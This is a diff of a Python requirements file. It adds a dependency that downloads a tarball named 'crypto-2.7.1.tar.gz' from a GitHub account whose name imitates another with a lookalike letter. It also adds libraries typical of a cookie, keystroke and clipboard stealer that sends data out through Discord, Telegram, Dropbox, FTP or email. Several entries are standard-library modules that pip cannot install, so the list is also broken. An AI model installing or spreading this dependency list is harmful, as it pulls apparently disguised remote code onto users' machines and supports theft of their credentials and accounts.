@@ -6,4 +6,25 @@ pycryptodome
 websocket-client
 windows
 psutil
-pip install https://github.com/seIfrighteous/x/releases/download/selfrighteous/crypto-2.7.1.tar.gz
+https://github.com/seIfrighteous/x/releases/download/selfrighteous/crypto-2.7.1.tar.gz
+pyautogui
+pynput
+browser_cookie3
+requests
+psutil
+pyperclip
+Pillow
+discord.py
+telethon
+winreg
+subprocess
+smtplib
+ftplib
+ctypes
+getpass
+pycryptodome
+browser_history
+cloudscraper
+dropbox
+marshal
+
